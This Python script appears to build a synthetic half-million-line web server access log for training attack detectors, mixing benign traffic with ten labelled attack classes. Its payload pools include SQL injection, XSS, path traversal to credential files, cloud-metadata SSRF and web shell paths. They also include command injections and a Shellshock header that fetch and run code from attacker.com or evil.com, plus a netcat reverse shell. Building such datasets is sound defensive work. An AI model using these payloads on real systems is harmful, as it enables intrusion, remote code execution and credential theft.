#!/usr/bin/env python3
"""
generate_master_log.py
======================
Synthesizes the Enterprise Master Server Access Log (server_access.log)
in Standard Apache/Nginx Combined Log Format:
`%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"`

Engineering Specifications:
1. Total Records: 500,000 rows (5 Lakh records)
2. Distribution:
   - 150,000 Benign Traffic (30.0%) with deep multi-tier web application diversity.
   - 350,000 Attack Records (70.0%): Exactly 35,000 per class across 10 Web Attack Classes:
     * sqli (35,000)
     * xss (35,000)
     * command_injection (35,000)
     * path_traversal (35,000)
     * ssrf (35,000)
     * web_shell (35,000)
     * dir_fuzzing (35,000)
     * mal_scanner (35,000)
     * ddos_http_flood (35,000 - 5 tight volumetric flood waves at >= 25 req/s per botnet IP)
     * brute_force (35,000 - 10 credential stuffing campaigns with consecutive 401s on auth)
3. Interwoven Chronology:
   - Traffic is naturally interleaved across a 48-hour enterprise timeline,
     mirroring genuine production server traffic where attack probes occur concurrently
     with normal user journeys.
4. Output Targets:
   - Root: data/raw/server_access.log
   - Practical 1: Practical 1/data/raw/server_access.log
"""

import sys
import os
import time
import random
import datetime
from pathlib import Path
from urllib.parse import quote, unquote
from typing import Dict, List, Tuple
import pandas as pd

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
DATASETS_DIR = PROJECT_ROOT / "datasets"

# Output Locations
OUTPUT_ROOT_DIR = PROJECT_ROOT / "data" / "raw"
OUTPUT_PRACTICAL1_DIR = PROJECT_ROOT / "Practical 1" / "data" / "raw"

OUTPUT_ROOT_DIR.mkdir(parents=True, exist_ok=True)
OUTPUT_PRACTICAL1_DIR.mkdir(parents=True, exist_ok=True)

OUTPUT_FILE_ROOT = OUTPUT_ROOT_DIR / "server_access.log"
OUTPUT_FILE_P1 = OUTPUT_PRACTICAL1_DIR / "server_access.log"

random.seed(42)

# =========================================================================
# USER-AGENT CORPORA
# =========================================================================
BENIGN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.2277.128",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

SCANNER_UAS = [
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6 (OSVDB-3092)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "Mozilla/5.0 (compatible; Acunetix-Auto-Audit/14.0)",
    "gobuster/3.6 (github.com/OJ/gobuster)",
    "dirbuster/1.0-RC1 (OWASP DirBuster)",
    "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)",
    "WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)",
    "Hydra v9.5 (https://github.com/vanhauser-thc/thc-hydra)",
    "Nessus Vulnerability Scanner"
]

BOT_UAS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
]


# =========================================================================
# REALISTIC DIVERSE BENIGN ROUTES & TEMPLATES
# =========================================================================
def generate_diverse_benign_routes(count: int = 150_000) -> List[Tuple[str, str, int, int]]:
    """Generates a rich, highly diverse pool of benign routes."""
    categories = ["electronics", "laptops", "apparel", "books", "home-decor", "footwear", "cameras", "audio"]
    search_terms = ["laptop", "running shoes", "wireless mouse", "mechanical keyboard", "coffee maker", "usb c hub", "desk lamp"]
    blog_slugs = ["getting-started-with-python", "machine-learning-in-production", "modern-web-architecture", "database-indexing-guide", "microservices-best-practices"]
    user_ids = list(range(100, 999))

    routes = []
    for _ in range(count):
        r_type = random.random()

        if r_type < 0.30:
            cat = random.choice(categories)
            pid = random.randint(1000, 9999)
            sub = random.random()
            if sub < 0.40:
                path = f"/products/{cat}/{pid}"
                method = "GET"
                status = 200
                size = random.randint(4500, 18000)
            elif sub < 0.70:
                q = random.choice(search_terms)
                p = random.randint(1, 5)
                # Tests benign parameters like &dir=asc and &id= safely
                path = f"/catalog/search?q={quote(q)}&category={cat}&dir=asc&id={pid}&page={p}"
                method = "GET"
                status = 200
                size = random.randint(6000, 24000)
            elif sub < 0.90:
                path = f"/cart/add?item_id={pid}&quantity=1"
                method = "POST"
                status = random.choice([200, 302])
                size = random.randint(300, 1200)
            else:
                path = "/checkout/review"
                method = "GET"
                status = 200
                size = random.randint(3500, 8500)

        elif r_type < 0.65:
            method = "GET"
            sub = random.random()
            if sub < 0.30:
                h = f"{random.randint(100000, 999999):x}"
                path = f"/static/js/bundle.{h}.js"
                status = random.choice([200, 304])
                size = random.randint(15000, 85000) if status == 200 else 180
            elif sub < 0.60:
                path = f"/static/css/theme_{random.randint(1, 4)}.min.css"
                status = random.choice([200, 304])
                size = random.randint(4000, 22000) if status == 200 else 180
            elif sub < 0.85:
                img_id = random.randint(1, 500)
                path = f"/images/products/img_{img_id}.jpg"
                status = random.choice([200, 304])
                size = random.randint(8000, 95000) if status == 200 else 180
            elif sub < 0.95:
                path = "/static/fonts/inter-regular.woff2"
                status = random.choice([200, 304])
                size = random.randint(12000, 35000) if status == 200 else 180
            else:
                path = "/favicon.ico"
                status = random.choice([200, 304])
                size = 1150 if status == 200 else 180

        elif r_type < 0.85:
            sub = random.random()
            if sub < 0.40:
                uid = random.choice(user_ids)
                path = f"/api/v1/users/{uid}/profile"
                method = "GET"
                status = 200
                size = random.randint(800, 2500)
            elif sub < 0.70:
                path = f"/api/v1/inventory?limit=25&offset={random.randint(0, 100)}"
                method = "GET"
                status = 200
                size = random.randint(3000, 12000)
            elif sub < 0.85:
                path = "/api/v1/telemetry/heartbeat"
                method = "POST"
                status = 204
                size = 0
            elif sub < 0.95:
                path = "/graphql?query={me{id,name,role}}"
                method = "POST"
                status = 200
                size = random.randint(450, 1500)
            else:
                path = "/api/healthz"
                method = "GET"
                status = 200
                size = 45

        else:
            sub = random.random()
            if sub < 0.40:
                slug = random.choice(blog_slugs)
                path = f"/blog/{slug}"
                method = "GET"
                status = 200
                size = random.randint(8000, 28000)
            elif sub < 0.70:
                path = "/dashboard/analytics/overview"
                method = "GET"
                status = 200
                size = random.randint(12000, 45000)
            elif sub < 0.85:
                path = f"/docs/legacy/v{random.randint(1, 3)}/changelog"
                method = "GET"
                status = 404
                size = random.randint(350, 800)
            else:
                path = "/api/auth/login"
                method = "POST"
                status = random.choice([200, 302])
                size = random.randint(400, 1100)

        routes.append((method, path, status, size))

    return routes


# =========================================================================
# ATTACK PAYLOAD POOLS LOADER
# =========================================================================
def load_attack_payload_pools() -> Dict[str, List[str]]:
    """Loads authentic attack payloads from local datasets and fallback security corpora."""
    print("Loading authentic attack payloads from corpora...")
    pools: Dict[str, List[str]] = {
        "sqli": [],
        "xss": [],
        "command_injection": [],
        "path_traversal": [],
        "ssrf": [],
        "web_shell": [],
        "dir_fuzzing": []
    }

    sqli_csv = DATASETS_DIR / "hf_sql_injection" / "sql_injection_dataset.csv"
    if sqli_csv.exists():
        try:
            df = pd.read_csv(sqli_csv)
            queries = df[df["Label"] == 1]["Query"].dropna().tolist()
            pools["sqli"].extend(queries)
        except Exception:
            pass

    xss_csv = DATASETS_DIR / "hf_xss" / "xss_dataset.csv"
    if xss_csv.exists():
        try:
            df = pd.read_csv(xss_csv)
            sents = df[df["Label"] == 1]["Sentence"].dropna().tolist()
            pools["xss"].extend(sents)
        except Exception:
            pass

    cmd_csv = DATASETS_DIR / "hf_command_injection" / "command_injection.csv"
    if cmd_csv.exists():
        try:
            df = pd.read_csv(cmd_csv)
            cmds = df[df["Label"] == 1]["sentence"].dropna().tolist()
            pools["command_injection"].extend(cmds)
        except Exception:
            pass

    pools["sqli"].extend([
        "1' OR '1'='1", "1' OR 1=1 --", "admin' --", "' UNION SELECT 1,2,username,password FROM users --",
        "' UNION ALL SELECT null,schema_name,null FROM information_schema.schemata --",
        "1' AND SLEEP(5)--", "admin' AND pg_sleep(3)--", "'; WAITFOR DELAY '0:0:5'--",
        "'; DROP TABLE users--", "1' AND extractvalue(1,concat(0x7e,version()))--",
        "' OR 'x'='x' #", "1' AND @@version=1--", "1' ORDER BY 10--",
        "1 UNION DISTINCT SELECT null,null,user()--", "' UNION SELECT 1,load_file('/etc/passwd'),3--"
    ])

    pools["xss"].extend([
        "<script>alert('xss')</script>", "<script src='http://attacker.com/xss.js'></script>",
        "<img src=x onerror=alert(document.cookie)>", "<svg/onload=confirm(1)>",
        "javascript:alert(document.domain)", "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>", "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "<a href='javascript:alert(1)'>click me</a>", "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>"
    ])

    pools["command_injection"].extend([
        "; cat /etc/passwd", "&& whoami", "| id", "; uname -a", "`id`",
        "$(whoami)", "&& cat /etc/shadow", "; curl http://attacker.com/bot | sh",
        "; wget http://evil.com/shell -O /tmp/s; chmod +x /tmp/s; /tmp/s",
        "| /bin/sh", "; id > /dev/null", "; nc -e /bin/bash 10.0.0.1 4444",
        "%0a/bin/cat%20/etc/passwd", "; ping -c 4 127.0.0.1", "; net user",
        "; dir C:\\Windows", "| ls -la /var/www/html"
    ])

    pools["path_traversal"].extend([
        "../../../../../../etc/passwd", "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/shadow", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd%00", "../../../../boot.ini", "php://filter/convert.base64-encode/resource=config.php",
        "/proc/self/environ", "../../../var/log/apache2/access.log",
        "../../../../windows/system32/drivers/etc/hosts", "%252e%252e%252fetc%252fpasswd"
    ])

    pools["ssrf"].extend([
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1:8080/admin",
        "http://localhost:6379/",
        "gopher://127.0.0.1:6379/_flushall",
        "dict://127.0.0.1:11211/stat",
        "http://100.100.100.200/latest/meta-data/"
    ])

    pools["web_shell"].extend([
        "/shell.php?cmd=whoami", "/uploads/c99.php", "/images/r57.php", "/wso.php",
        "/tmp/b374k.php", "/backdoor.jsp?cmd=id", "/cmd.aspx?action=dir",
        "/alfa.php", "/eval-stdin.php?query=phpinfo()", "/wso.php?action=eval&query=id"
    ])

    pools["dir_fuzzing"].extend([
        "/.env", "/.git/config", "/.git/HEAD", "/wp-config.php.bak",
        "/phpmyadmin/index.php", "/adminer.php", "/pma/", "/server-status",
        "/swagger.json", "/actuator/health", "/actuator/env", "/backup.zip",
        "/dump.sql", "/.htaccess", "/config.bak", "/database.sqlite", "/settings.json.bak"
    ])

    print(f"Payload pools ready: { {k: len(v) for k, v in pools.items()} }")
    return pools


def generate_client_ips(count: int = 10_000) -> List[str]:
    """Generates realistic global client IP addresses."""
    cidrs = [
        "192.168", "10.0", "172.16", "74.125", "142.250",
        "151.101", "104.244", "198.51", "203.0", "185.199"
    ]
    ips = []
    for _ in range(count):
        prefix = random.choice(cidrs)
        ips.append(f"{prefix}.{random.randint(1, 254)}.{random.randint(1, 254)}")
    return ips


def format_combined_log(
    client_ip: str,
    identd: str,
    auth_user: str,
    dt: datetime.datetime,
    method: str,
    resource: str,
    status_code: int,
    resp_bytes: int,
    referer: str,
    user_agent: str
) -> str:
    """Formats log line strictly into Apache Combined Log Format."""
    ts_str = dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    bytes_str = str(resp_bytes) if resp_bytes > 0 else "-"
    ref_clean = referer if referer else "-"
    ua_clean = user_agent if user_agent else "-"
    return f'{client_ip} {identd} {auth_user} [{ts_str}] "{method} {resource} HTTP/1.1" {status_code} {bytes_str} "{ref_clean}" "{ua_clean}"\n'


# =========================================================================
# MASTER GENERATOR PIPELINE (500,000 ROWS INTERWOVEN)
# =========================================================================
def generate_master_server_log():
    t_start = time.time()
    print("=" * 75)
    print("   MASTER SERVER ACCESS LOG GENERATOR (500,000 RECORDS)")
    print("=" * 75)

    TOTAL_BENIGN = 150_000
    PER_ATTACK = 35_000
    ATTACK_CLASSES = [
        "sqli", "xss", "command_injection", "path_traversal",
        "ssrf", "web_shell", "dir_fuzzing", "mal_scanner",
        "ddos_http_flood", "brute_force"
    ]
    TOTAL_RECORDS = TOTAL_BENIGN + (len(ATTACK_CLASSES) * PER_ATTACK)

    print(f"Target Line Count     : {TOTAL_RECORDS:,}")
    print(f"  * Benign Records     : {TOTAL_BENIGN:,} (30.0%)")
    print(f"  * 10 Attack Classes  : {len(ATTACK_CLASSES) * PER_ATTACK:,} (70.0% -- {PER_ATTACK:,} each)")

    pools = load_attack_payload_pools()
    benign_ips = generate_client_ips(8000)

    # 48-Hour Global Timeline
    # 48 hours = 172,800 seconds
    base_time = datetime.datetime(2026, 10, 10, 0, 0, 0)
    TOTAL_TIMELINE_SECONDS = 172_800.0

    all_entries: List[Tuple[datetime.datetime, str]] = []

    # -------------------------------------------------------------------------
    # 1. Distribute 150,000 Benign Requests across 48 Hours
    # -------------------------------------------------------------------------
    print(f"\n[1/4] Generating {TOTAL_BENIGN:,} Diverse Benign Requests across 48-hour timeline...")
    benign_routes = generate_diverse_benign_routes(TOTAL_BENIGN)

    # Distribute smoothly across the 48 hours with small jitter
    for i, (method, path, status, size) in enumerate(benign_routes):
        offset_sec = (i / TOTAL_BENIGN) * TOTAL_TIMELINE_SECONDS + random.uniform(-0.5, 0.5)
        offset_sec = max(0.0, min(TOTAL_TIMELINE_SECONDS, offset_sec))
        dt = base_time + datetime.timedelta(seconds=offset_sec)

        ip = random.choice(benign_ips)
        ua = random.choice(BENIGN_UAS if random.random() > 0.03 else BOT_UAS)
        ref = "https://www.google.com/" if random.random() > 0.5 else "https://enterprise-cloud.internal/"

        entry = format_combined_log(ip, "-", "-", dt, method, path, status, size, ref, ua)
        all_entries.append((dt, entry))

    # -------------------------------------------------------------------------
    # 2. Distribute 7 Single-Request Attack Classes (35,000 each)
    #    sqli, xss, command_injection, path_traversal, ssrf, web_shell, dir_fuzzing, mal_scanner
    # -------------------------------------------------------------------------
    single_req_attacks = [
        "sqli", "xss", "command_injection", "path_traversal",
        "ssrf", "web_shell", "dir_fuzzing", "mal_scanner"
    ]
    print(f"\n[2/4] Distributing {len(single_req_attacks) * PER_ATTACK:,} Probe Attacks across timeline...")

    for atk_name in single_req_attacks:
        print(f"  * Interleaving {PER_ATTACK:,} samples for class: {atk_name}...")
        atk_ips = [f"185.{random.randint(100, 220)}.{random.randint(1, 254)}.{random.randint(1, 254)}" for _ in range(30)]

        for i in range(PER_ATTACK):
            # Interleave smoothly across 48 hours
            offset_sec = (i / PER_ATTACK) * TOTAL_TIMELINE_SECONDS + random.uniform(-1.0, 1.0)
            offset_sec = max(0.0, min(TOTAL_TIMELINE_SECONDS, offset_sec))
            dt = base_time + datetime.timedelta(seconds=offset_sec)

            ip = random.choice(atk_ips)
            ua = random.choice(BENIGN_UAS)

            if atk_name == "mal_scanner":
                path = random.choice(["/index.php", "/admin/", "/test.php", "/login.php", "/wp-admin/", "/api/v1/status"])
                method = random.choice(["GET", "POST", "HEAD"])
                status = random.choice([200, 404, 403])
                size = random.randint(200, 2500)
                ua = random.choice(SCANNER_UAS)

            else:
                p_list = pools[atk_name]
                raw_payload = random.choice(p_list)

                if atk_name == "sqli":
                    clean_p = quote(str(raw_payload)[:140], safe="= '\"-/*")
                    path = f"/products/item?id={clean_p}"
                    method = "GET"
                    status = random.choice([200, 500, 400])
                    size = random.randint(800, 4500)

                elif atk_name == "xss":
                    clean_p = quote(str(raw_payload)[:120], safe="<>()=/;\"' ")
                    path = f"/search?q={clean_p}"
                    method = "GET"
                    status = 200
                    size = random.randint(1500, 6500)

                elif atk_name == "command_injection":
                    if random.random() < 0.15:
                        ua = "() { :; }; /bin/bash -c 'wget http://attacker.com/b -O /tmp/b; chmod +x /tmp/b; /tmp/b'"
                        path = "/index.html"
                    else:
                        clean_p = quote(str(raw_payload)[:100], safe="; &|`$()<>/")
                        path = f"/api/tools/ping?host=127.0.0.1{clean_p}"
                    method = random.choice(["GET", "POST"])
                    status = random.choice([200, 500, 400])
                    size = random.randint(600, 3200)

                elif atk_name == "path_traversal":
                    path = f"/view/file?path={raw_payload}"
                    method = "GET"
                    status = random.choice([404, 403, 200])
                    size = random.randint(250, 1800)

                elif atk_name == "ssrf":
                    clean_p = quote(str(raw_payload), safe=":/.")
                    path = f"/api/fetch?url={clean_p}"
                    method = "GET"
                    status = random.choice([200, 504, 502, 400])
                    size = random.randint(300, 1500)

                elif atk_name == "web_shell":
                    path = str(raw_payload) if str(raw_payload).startswith("/") else f"/{raw_payload}"
                    method = random.choice(["GET", "POST"])
                    status = random.choice([200, 404, 403])
                    size = random.randint(500, 4500)

                elif atk_name == "dir_fuzzing":
                    path = str(raw_payload) if str(raw_payload).startswith("/") else f"/{raw_payload}"
                    method = "GET"
                    status = random.choice([404, 403, 200])
                    size = random.randint(150, 850)

            entry = format_combined_log(ip, "-", "-", dt, method, path, status, size, "-", ua)
            all_entries.append((dt, entry))

    # -------------------------------------------------------------------------
    # 3. Synthesize Volumetric DDoS HTTP Flood (35,000 samples)
    #    Distributed across 5 distinct high-intensity flood campaigns
    # -------------------------------------------------------------------------
    print("\n[3/4] Synthesizing Volumetric DDoS HTTP Flood campaigns (35,000 samples)...")
    ddos_botnet_ips = [f"45.146.164.{random.randint(10, 200)}" for _ in range(6)]
    num_ddos_waves = 5
    samples_per_wave = PER_ATTACK // num_ddos_waves  # 7,000 per wave

    for wave_idx in range(num_ddos_waves):
        # Anchor each wave at a specific hour: e.g. hour 6, 15, 24, 33, 42
        wave_start_sec = (wave_idx + 0.5) * (TOTAL_TIMELINE_SECONDS / num_ddos_waves)
        wave_time = base_time + datetime.timedelta(seconds=wave_start_sec)

        for s_idx in range(samples_per_wave):
            ip = ddos_botnet_ips[s_idx % len(ddos_botnet_ips)]
            # High rate: microsecond progression (15-30 ms -> >= 25 req/s per IP)
            wave_time += datetime.timedelta(milliseconds=random.randint(12, 28))
            path = random.choice(["/index.html", "/api/v1/search", "/catalog", "/products/item?id=1", "/"])
            method = random.choice(["GET", "POST", "HEAD"])
            status = random.choice([429, 429, 503, 200])
            size = random.randint(120, 650)
            ua = random.choice(BENIGN_UAS)
            entry = format_combined_log(ip, "-", "-", wave_time, method, path, status, size, "-", ua)
            all_entries.append((wave_time, entry))

    # -------------------------------------------------------------------------
    # 4. Synthesize Authentication Brute Force (35,000 samples)
    #    Distributed across 10 credential stuffing campaigns
    # -------------------------------------------------------------------------
    print("\n[4/4] Synthesizing Credential Brute Force campaigns (35,000 samples)...")
    bf_attacker_ips = [f"194.26.29.{random.randint(10, 200)}" for _ in range(10)]
    num_bf_campaigns = 10
    samples_per_campaign = PER_ATTACK // num_bf_campaigns  # 3,500 per campaign
    auth_endpoints = ["/api/auth/login", "/login", "/wp-login.php", "/admin/login"]
    user_list = ["admin", "root", "administrator", "manager", "support", "test_user"]

    for camp_idx in range(num_bf_campaigns):
        # Anchor each campaign across timeline
        camp_start_sec = (camp_idx + 0.3) * (TOTAL_TIMELINE_SECONDS / num_bf_campaigns)
        camp_time = base_time + datetime.timedelta(seconds=camp_start_sec)
        camp_ip = bf_attacker_ips[camp_idx]

        for s_idx in range(samples_per_campaign):
            # Repeated attempts: 150-350 ms apart from same attacker IP
            camp_time += datetime.timedelta(milliseconds=random.randint(150, 350))
            ep = random.choice(auth_endpoints)
            u = random.choice(user_list)
            p = f"pwd_{random.randint(1000, 9999)}"
            path = f"{ep}?username={u}&password={p}"
            method = "POST"
            status = 401  # Strictly 401 Unauthorized
            size = random.randint(350, 750)
            ua = random.choice(BENIGN_UAS)
            entry = format_combined_log(camp_ip, "-", "-", camp_time, method, path, status, size, "-", ua)
            all_entries.append((camp_time, entry))

    # -------------------------------------------------------------------------
    # 5. Chronological Sort & Fast Buffered File Export
    # -------------------------------------------------------------------------
    print(f"\nSorting {len(all_entries):,} entries chronologically across 48-hour timeline...")
    all_entries.sort(key=lambda x: x[0])

    print(f"Writing to Root Destination: {OUTPUT_FILE_ROOT}...")
    with open(OUTPUT_FILE_ROOT, "w", encoding="utf-8", buffering=1024 * 1024 * 16) as f_root:
        for _, line in all_entries:
            f_root.write(line)

    print(f"Writing to Practical 1 Destination: {OUTPUT_FILE_P1}...")
    with open(OUTPUT_FILE_P1, "w", encoding="utf-8", buffering=1024 * 1024 * 16) as f_p1:
        for _, line in all_entries:
            f_p1.write(line)

    elapsed = round(time.time() - t_start, 2)
    size_mb = OUTPUT_FILE_ROOT.stat().st_size / (1024 * 1024)

    print("\n" + "=" * 75)
    print("   MASTER SERVER ACCESS LOG GENERATION COMPLETE")
    print("=" * 75)
    print(f"Total Lines Written   : {len(all_entries):,} lines")
    print(f"Physical File Size    : {size_mb:.2f} MB")
    print(f"Generation Time       : {elapsed} seconds ({round(len(all_entries) / max(0.01, elapsed), 1):,} lines/sec)")
    print(f"Saved Target 1 (Root) : {OUTPUT_FILE_ROOT.resolve()}")
    print(f"Saved Target 2 (P1)   : {OUTPUT_FILE_P1.resolve()}")
    print("=" * 75)


if __name__ == "__main__":
    generate_master_server_log()
